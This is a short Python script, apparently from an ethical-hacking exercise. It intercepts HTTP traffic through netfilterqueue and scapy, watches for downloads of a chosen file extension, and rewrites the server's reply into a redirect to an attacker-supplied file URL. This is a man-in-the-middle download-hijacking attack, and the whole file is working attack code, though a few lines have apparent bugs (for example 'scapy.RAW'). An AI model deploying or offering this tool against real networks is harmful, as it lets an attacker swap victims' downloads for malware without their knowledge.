#!/usr/bin/env python
import os
import netfilterqueue
import argparse


# Ensure we can import scapy
os.sys.path += ['/home/kali/.local/lib/python2.7/site-packages']
import scapy.all as scapy



ack_list = []


def set_load(packet, new_file_url):
    packet[scapy.Raw].load = 'HTTP/1.1 301 Moved Permanently\nLocation: {}\n\n'.format(new_file_url)
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if extension in scapy_packet[scapy.RAW].load:
                print('[+] {} Request.'.format(extension))
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                print('[+] Replacing file')
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                modified_packet = set_load(packet, new_file_url)
                packet.set_payload(str(modified_packet))
    packet.accept()


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-e', dest='extension', help='Extension to look out for.', required=True)
    parser.add_argument('-f', dest='replacement_file', help='New file URL that will replace original.', required=True)
    args = parser.parse_args()
    extension = args.extension
    new_file_url = args.replacement_file

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)  # 0 is the identifiable number passed as --queue-num param
    queue.run()

